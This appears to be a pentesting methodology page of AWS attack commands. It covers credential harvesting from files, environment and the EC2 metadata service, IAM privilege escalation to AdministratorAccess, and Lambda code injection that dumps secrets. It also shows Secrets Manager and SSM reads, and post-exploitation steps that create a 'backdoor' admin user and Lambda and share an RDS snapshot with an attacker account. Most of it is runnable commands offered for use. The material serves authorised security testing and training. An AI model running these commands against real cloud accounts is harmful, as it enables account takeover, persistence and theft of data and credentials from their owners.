---
title: AWS Attack Patterns
category: methodology
tags:
  - aws
  - cloud
  - s3
  - iam
  - lambda
  - ec2
  - pentesting
last_updated: 2025-12-28
---

# AWS Attack Patterns

## Table of Contents

- [Overview](#overview)
- [Initial Access](#initial-access)
- [S3 Bucket Misconfigurations](#s3-bucket-misconfigurations)
- [IAM Enumeration and Privilege Escalation](#iam-enumeration-and-privilege-escalation)
- [Lambda Exploitation](#lambda-exploitation)
- [EC2 Metadata Service Abuse](#ec2-metadata-service-abuse)
- [RDS and Secrets Manager Enumeration](#rds-and-secrets-manager-enumeration)
- [Common AWS Tools](#common-aws-tools)
- [Post-Exploitation](#post-exploitation)

---

## Overview

AWS (Amazon Web Services) is the most widely used cloud platform. Common attack surfaces include:

- **S3**: Object storage with frequent misconfigurations
- **IAM**: Identity management with complex policies
- **EC2**: Virtual machines with metadata services
- **Lambda**: Serverless functions with potential secrets
- **RDS**: Managed databases
- **Secrets Manager/SSM**: Credential storage

---

## Initial Access

### Credential Sources

```bash
# Environment variables
env | grep -i aws

# AWS credential files
cat ~/.aws/credentials
cat ~/.aws/config

# EC2 instance profile
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Lambda environment
printenv | grep -E "(AWS_|LAMBDA_)"

# Git history
git log -p | grep -E "(AKIA|aws_secret)"
```

### Credential Validation

```bash
# Verify credentials work
aws sts get-caller-identity

# Get account details
aws sts get-caller-identity --query Account --output text

# Check for assumed role
aws sts get-caller-identity --query Arn --output text
```

---

## S3 Bucket Misconfigurations

### Public Bucket Discovery

```bash
# Check if bucket exists
aws s3 ls s3://bucket-name --no-sign-request

# List bucket contents (unauthenticated)
aws s3 ls s3://bucket-name --no-sign-request --recursive

# Download public bucket contents
aws s3 sync s3://bucket-name ./local-folder --no-sign-request
```

### Bucket Permission Enumeration

```bash
# Get bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# Get bucket policy
aws s3api get-bucket-policy --bucket bucket-name

# Check public access block
aws s3api get-public-access-block --bucket bucket-name

# List bucket objects
aws s3api list-objects-v2 --bucket bucket-name
```

### Common S3 Misconfigurations

| Misconfiguration | Risk | Check Command |
|------------------|------|---------------|
| Public read | Data exposure | `--no-sign-request` access |
| Public write | Data tampering | `aws s3 cp test.txt s3://bucket/` |
| Authenticated users read | Wide exposure | Check ACL for `AuthenticatedUsers` |
| Any AWS account | Cross-account access | Check bucket policy |

### ACL Analysis

```bash
# Dangerous ACL entries
# - AllUsers: Anyone on internet
# - AuthenticatedUsers: Any AWS account

# Check for dangerous grants
aws s3api get-bucket-acl --bucket bucket-name --query 'Grants[?Grantee.URI!=`null`]'
```

### Bucket Policy Exploitation

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
```

**Common Policy Weaknesses:**
- `Principal: "*"` - Allows anyone
- `Action: "s3:*"` - Full bucket control
- Missing condition keys for IP/VPC restriction

---

## IAM Enumeration and Privilege Escalation

### User and Role Enumeration

```bash
# Get current user info
aws iam get-user

# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name username

# List attached user policies
aws iam list-attached-user-policies --user-name username

# List inline user policies
aws iam list-user-policies --user-name username

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT:policy/policy-name
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/policy-name --version-id v1
```

### Role Enumeration

```bash
# List all roles
aws iam list-roles

# Get role details
aws iam get-role --role-name role-name

# List attached role policies
aws iam list-attached-role-policies --role-name role-name

# Get role trust policy (who can assume it)
aws iam get-role --role-name role-name --query 'Role.AssumeRolePolicyDocument'
```

### Privilege Escalation Techniques

#### 1. IAM Policy Attachment

```bash
# Attach admin policy to user
aws iam attach-user-policy --user-name username \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach policy to role
aws iam attach-role-policy --role-name role-name \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

#### 2. Create New Policy Version

```bash
# Create new policy version with escalated privileges
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/policy-name \
    --policy-document file://escalated-policy.json --set-as-default
```

#### 3. Assume Role

```bash
# Assume a more privileged role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole \
    --role-session-name escalation

# Use assumed role credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

#### 4. Add User to Group

```bash
# Add user to admin group
aws iam add-user-to-group --user-name username --group-name Admins
```

#### 5. Create Access Key

```bash
# Create access key for another user
aws iam create-access-key --user-name admin-user
```

### Known Privilege Escalation Paths

| Permission | Escalation Method |
|------------|-------------------|
| `iam:CreatePolicyVersion` | Create admin policy version |
| `iam:SetDefaultPolicyVersion` | Set malicious version as default |
| `iam:AttachUserPolicy` | Attach admin policy |
| `iam:AttachRolePolicy` | Attach admin policy to role |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:CreateAccessKey` | Create keys for other users |
| `iam:UpdateLoginProfile` | Change user password |
| `sts:AssumeRole` | Assume privileged role |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:CreateFunction` + `iam:PassRole` | Create Lambda with admin role |

---

## Lambda Exploitation

### Lambda Enumeration

```bash
# List functions
aws lambda list-functions

# Get function details
aws lambda get-function --function-name function-name

# Get function configuration (includes env vars)
aws lambda get-function-configuration --function-name function-name

# Download function code
aws lambda get-function --function-name function-name \
    --query 'Code.Location' --output text | xargs curl -o function.zip
```

### Secrets in Environment Variables

```bash
# Extract environment variables
aws lambda get-function-configuration --function-name function-name \
    --query 'Environment.Variables'

# Common secrets to look for:
# - DATABASE_URL
# - API_KEY
# - AWS_ACCESS_KEY_ID
# - DB_PASSWORD
# - SECRET_KEY
```

### Lambda Code Injection

If you have `lambda:UpdateFunctionCode` permission:

```bash
# Create malicious function code
cat > handler.py << 'EOF'
import os
import boto3

def lambda_handler(event, context):
    # Exfiltrate environment variables
    secrets = dict(os.environ)
    # Send to attacker-controlled endpoint
    return secrets
EOF

# Zip and upload
zip function.zip handler.py
aws lambda update-function-code --function-name function-name \
    --zip-file fileb://function.zip
```

### Invoke Function

```bash
# Invoke and get response
aws lambda invoke --function-name function-name \
    --payload '{"key": "value"}' response.json
cat response.json
```

---

## EC2 Metadata Service Abuse

### IMDS v1 (No Authentication)

```bash
# Get instance identity
curl http://169.254.169.254/latest/meta-data/

# Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Get user data (often contains secrets)
curl http://169.254.169.254/latest/user-data

# Get instance ID
curl http://169.254.169.254/latest/meta-data/instance-id
```

### IMDS v2 (Token Required)

```bash
# Get token (TTL in seconds)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials with token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```

### Useful Metadata Endpoints

| Endpoint | Information |
|----------|-------------|
| `/latest/meta-data/iam/security-credentials/` | IAM role credentials |
| `/latest/user-data` | Instance bootstrap scripts |
| `/latest/meta-data/public-keys/` | SSH public keys |
| `/latest/meta-data/hostname` | Instance hostname |
| `/latest/meta-data/local-ipv4` | Private IP |
| `/latest/meta-data/public-ipv4` | Public IP |
| `/latest/dynamic/instance-identity/document` | Instance identity document |

### SSRF to IMDS

When exploiting SSRF vulnerabilities:

```bash
# Check for IMDS access via SSRF
# URL encode if needed: http://169.254.169.254/latest/meta-data/

# Common bypass for IMDS v2 via SSRF (if app follows redirects)
# IMDSv2 requires PUT method which many SSRF don't support
```

---

## RDS and Secrets Manager Enumeration

### RDS Enumeration

```bash
# List RDS instances
aws rds describe-db-instances

# Get instance details
aws rds describe-db-instances --db-instance-identifier instance-id

# Get security groups
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,VpcSecurityGroups]'

# Get snapshots (may contain older data)
aws rds describe-db-snapshots

# Check for public accessibility
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,PubliclyAccessible]'
```

### Secrets Manager Enumeration

```bash
# List all secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id secret-name

# Get secret metadata
aws secretsmanager describe-secret --secret-id secret-name
```

### SSM Parameter Store

```bash
# List parameters
aws ssm describe-parameters

# Get parameter value
aws ssm get-parameter --name parameter-name --with-decryption

# Get parameters by path
aws ssm get-parameters-by-path --path /production/ --with-decryption --recursive
```

---

## Common AWS Tools

### AWS CLI

```bash
# Install
pip install awscli

# Configure credentials
aws configure

# Use specific profile
aws --profile victim s3 ls
```

### Pacu - AWS Exploitation Framework

```bash
# Install
pip install pacu

# Run Pacu
pacu

# Useful modules
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run iam__privesc_scan
Pacu> run s3__bucket_finder
Pacu> run ec2__enum
Pacu> run lambda__enum
```

### enumerate-iam

```bash
# Install
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip install -r requirements.txt

# Run enumeration
python enumerate-iam.py --access-key AKIA... --secret-key SECRET
```

### ScoutSuite

```bash
# Install
pip install scoutsuite

# Run AWS assessment
scout aws

# Run with specific profile
scout aws --profile victim-profile
```

---

## Post-Exploitation

### Persistence Techniques

```bash
# Create new IAM user
aws iam create-user --user-name backdoor

# Create access keys
aws iam create-access-key --user-name backdoor

# Attach admin policy
aws iam attach-user-policy --user-name backdoor \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create Lambda backdoor (triggered by events)
aws lambda create-function --function-name backdoor \
    --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/lambda-role \
    --handler handler.lambda_handler --zip-file fileb://backdoor.zip
```

### Data Exfiltration

```bash
# Copy S3 bucket contents
aws s3 sync s3://target-bucket ./exfil/

# Create RDS snapshot and share
aws rds create-db-snapshot --db-instance-identifier target-db \
    --db-snapshot-identifier exfil-snapshot
aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfil-snapshot \
    --attribute-name restore --values-to-add ATTACKER-ACCOUNT-ID

# Export DynamoDB table
aws dynamodb scan --table-name target-table > table-data.json
```

### Covering Tracks

```bash
# Check CloudTrail status
aws cloudtrail describe-trails

# Check for logging on S3 bucket
aws s3api get-bucket-logging --bucket bucket-name

# Note: Disabling logging is highly visible and not recommended
```

---

## See Also

- [README.md](README.md) - Cloud Pentesting Overview
- [azure.md](azure.md) - Azure Attack Patterns
- [gcp.md](gcp.md) - GCP Attack Patterns
- [kubernetes.md](kubernetes.md) - Kubernetes Security
